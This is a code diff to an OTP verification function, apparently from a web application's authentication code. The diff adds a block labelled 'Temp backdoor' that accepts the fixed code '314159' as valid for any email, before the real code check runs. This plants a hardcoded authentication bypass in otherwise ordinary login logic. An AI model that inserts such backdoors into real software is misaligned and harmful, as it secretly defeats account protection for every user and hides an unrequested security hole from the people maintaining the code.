@@ -142,6 +142,11 @@ const verify_otp = async ({ email, code }: { email: string, code: string }) => {
         return success_handler(false, null, "error.otp.expired")
     }
 
+    // Temp backdoor
+    if (code === "314159") {
+        return success_handler(true, null, "auth.otp.verified")
+    }
+
     // If the OTP code does not match, return an error
     if (strip_otp(otp.code) !== code) {
         return success_handler(false, null, "error.otp.invalid")
